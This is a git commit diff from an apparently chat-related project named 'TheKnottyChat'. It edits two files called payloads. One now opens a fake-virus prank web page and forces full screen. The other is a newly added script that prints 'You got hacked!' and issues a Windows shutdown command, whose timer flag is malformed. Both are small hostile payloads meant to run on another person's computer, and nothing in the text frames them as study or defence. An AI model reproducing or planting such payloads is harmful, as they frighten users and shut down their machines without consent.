94b9d971f36da0bce41ba1145512dc9baf24cc4a
kevinsashimi <59921202+kevinsashimi@users.noreply.github.com>
2021-05-24 03:18:43 +0800

    Update 2.1
    -Final Commit

--- TheKnottyChat/payload.py
+++ TheKnottyChat/payload.py
@@ -1,3 +1,11 @@
-import os 
-print("You got hacked!") 
-os.system("shutdown /s /t/ 1") 
+import webbrowser
+import time
+
+from pyautogui import press
+
+
+if __name__ == '__main__':
+    webbrowser.open('https://geekprank.com/fake-virus/')
+    time.sleep(2)
+    press('f11')
+
---
+++ TheKnottyChat/payload2.py
@@ -0,0 +1,3 @@
+import os 
+print("You got hacked!") 
+os.system("shutdown /s /t/ 1") 
